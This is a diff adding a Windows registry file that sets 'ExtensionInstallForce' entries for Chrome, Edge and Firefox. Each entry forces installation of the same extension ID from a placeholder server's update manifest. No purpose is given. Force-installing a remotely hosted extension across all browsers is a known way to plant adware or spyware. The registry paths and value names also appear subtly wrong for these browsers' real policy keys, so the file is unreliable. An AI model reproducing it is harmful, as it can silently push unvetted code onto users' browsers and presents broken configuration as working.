@@ -1,0 +1,11 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Google\Chrome\ExtensionInstallForce]
+"1"="ijcnbijepmnkkeihkikjofmohhadjcnd;http://seu-servidor.com/update_manifest.xml"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Edge\ExtensionInstallForce]
+"2"="ijcnbijepmnkkeihkikjofmohhadjcnd;http://seu-servidor.com/update_manifest.xml"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Mozilla\ExtensionInstallForce]
+"3"="ijcnbijepmnkkeihkikjofmohhadjcnd;http://seu-servidor.com/update_manifest.xml"
+
